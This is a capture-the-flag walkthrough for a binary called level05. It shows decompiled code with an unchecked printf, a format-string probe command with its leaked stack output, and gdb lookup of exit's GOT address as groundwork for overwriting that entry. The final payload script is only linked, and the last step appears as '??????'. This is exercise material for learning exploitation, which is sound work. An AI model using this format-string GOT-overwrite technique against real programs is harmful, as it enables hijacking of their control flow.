# level05 walkthrough

Given 32-bit binary, after decompilation we can see that we have an fgets call that reads a string into buffer and a printf call with the string provided from prompt after some mutation:

    char buff[100];
    unsigned int i;

    i = 0;
    fgets(buff, 100, stdin);
    for ( i = 0; i < strlen(buff); ++i )
    {
        if (buff[i] > 'A' && buff[i] <= 'Z' )
            buff[i] ^= 0x20;
    }
    printf(buff);
    exit(0);

The only thing that we can exploit here is a printf call since we have an almost complete control over it's format string.
If we pass the string `python -c 'print "ABCD" + "%x-" * 10' | ./level05` to the prompt then we will find start of our input on 10th position in printf output.

    $ python -c 'print "ABCD" + "%x-" * 10' | ./level05

    abcd64-f7fcfac0-f7ec3b11-ffffd5ef-ffffd5ee-0-ffffffff-ffffd674-f7fdb000-64636261-

Using gdb we can examine GOT table and find the address of exit():

    info function exit
    All functions matching regular expression "exit":

    Non-debugging symbols:
    0x08048370  exit
    0x08048370  exit@plt

Now we can craft a format string for printf in a way to modify exit function value in the GOT table.
For that we wrote a [python script](Resources/gdb_str.py).
??????
Profit!
